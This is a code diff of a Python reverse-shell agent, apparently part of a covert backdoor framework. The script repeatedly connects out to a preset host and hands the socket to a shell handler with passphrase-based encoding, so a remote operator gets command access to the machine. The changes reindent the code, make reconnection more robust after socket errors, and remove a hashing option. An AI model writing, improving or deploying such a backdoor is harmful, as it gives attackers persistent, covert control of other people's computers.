@@ -18,29 +18,34 @@ closed = True
 
 while True :
 
-    if closed :
-        try :
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect( addr )
-            closed = False
-        except Exception as e:
-            sleep( delay )
-            continue
+	if closed :
+		try :
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect( addr )
+			closed = False
+		except Exception as e:
+			sleep( delay )
+			continue
 
-    def recv () :
-        global closed
-        ret = s.recv(50)
-        if ret == '' :      # in empty string socket is closed
-            closed = True
-            s.close()
-            # ret = 'X'
-        return ret
+	def recv () :
+		global closed
+		try :
+			ret = s.recv(50)
+			if ret == '' :	  # in empty string socket is closed
+				closed = True
+				s.close()
+		except :
+			closed = True
+			return ''
+			# print "Connection Terminated"
+			# ret = 'X'
+		return ret
 
 
-    def send( raw ) :
-    	return s.send( raw )
+	def send( raw ) :
+		return s.send( raw )
 
-    orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
-    handler = ExtendableShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
+	orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True )
+	handler = ExtendableShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
 
-    while not closed : sleep(1)
+	while not closed : sleep(1)
